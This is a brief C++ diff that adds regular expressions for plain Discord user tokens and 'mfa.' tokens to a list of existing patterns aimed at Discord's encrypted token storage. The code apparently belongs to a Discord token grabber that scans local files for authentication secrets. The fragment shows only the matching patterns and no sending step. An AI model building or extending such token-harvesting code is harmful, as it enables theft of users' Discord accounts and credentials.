@@ -62,7 +62,8 @@ public:
             regex_list.emplace_back(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");
             regex_list.emplace_back("dQw4w9WgXcQ:(.*?)=");
 
-            
+            regex_list.emplace_back(R"((?:\w|-){24}\.(?:\w|-){6}\.(?:\w|-){27})");
+            regex_list.emplace_back(R"(mfa\.(?:\w|-){84})");
 
             std::mutex mtx;
 
